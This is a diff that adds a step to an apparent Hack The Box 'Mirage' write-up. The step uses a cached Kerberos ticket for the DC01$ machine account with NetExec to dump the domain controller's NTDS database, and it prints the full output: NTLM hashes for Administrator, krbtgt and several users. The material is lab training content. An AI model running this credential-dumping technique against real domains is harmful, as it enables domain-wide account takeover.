@@ -969,8 +969,31 @@ I can get a TGT for the `DC01$` machine account
 ```python
 ❯❯❯ export KRB5CCNAME=DC01\$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
 
-
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb --use-kcache --ntds
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\DC01$ from ccache 
+SMB         dc01.mirage.htb 445    dc01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         dc01.mirage.htb 445    dc01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
+SMB         dc01.mirage.htb 445    dc01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc01.mirage.htb 445    dc01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
+SMB         dc01.mirage.htb 445    dc01             mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+SMB         dc01.mirage.htb 445    dc01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
+SMB         dc01.mirage.htb 445    dc01             Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:5f62e853f3876d511ff8628cb59e757c:::
+SMB         dc01.mirage.htb 445    dc01             [+] Dumped 12 NTDS hashes to /home/kali/.nxc/logs/ntds/dc01_dc01.mirage.htb_2026-10-13_023340.ntds of which 10 were added to the database
+SMB         dc01.mirage.htb 445    dc01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc01.mirage.htb 445    dc01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/dc01_dc01.mirage.htb_2026-10-13_023340.ntds | cut -d ':' -f1
 ```
+
+I can then just dump the NTDS using the TGT of `DC01$`
+
+
 
 
 
